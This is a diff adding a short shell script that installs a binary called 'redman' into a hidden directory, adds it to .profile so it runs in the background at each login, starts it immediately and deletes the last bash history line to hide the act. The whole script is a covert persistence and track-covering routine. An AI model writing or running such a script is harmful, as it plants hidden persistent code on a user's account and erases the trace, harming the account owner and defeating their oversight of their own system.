@@ -1,0 +1,3 @@
+#!/bin/sh
+
+mkdir .redman ; cp /auto_home/nlephilippe/Documents/redman/redman $HOME/.redman/redman ; echo \".redman/redman whoami&\" >> .profile ;  $HOME/.redman/redman whoami& ; sed -i '$ d' $HOME/.bash_history
